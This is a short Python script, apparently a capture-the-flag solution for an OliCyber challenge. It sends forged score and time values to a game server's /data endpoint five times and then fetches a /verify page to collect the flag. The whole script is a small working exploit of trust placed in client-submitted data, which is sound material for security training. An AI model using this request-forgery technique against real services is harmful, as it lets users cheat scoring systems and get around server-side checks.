import requests 
url = "http://rpo.challs.olicyber.it"
dataUrl = url + "/data"
flagUrl = url + "/verify"

time = 0

r = requests.session()

ans = r.get(url).text

def makeRequest (r, score, time): 
    data = {
    "p1s" : score,
    "p2s" : 0,
    "time" : time
    }
    answ = r.post(dataUrl, data=data)
    return answ.text

for i in range(0, 5): 
    answ = makeRequest(r, i + 1, i + 10)
    print(answ)
answ = r.get(flagUrl).text
print(answ)



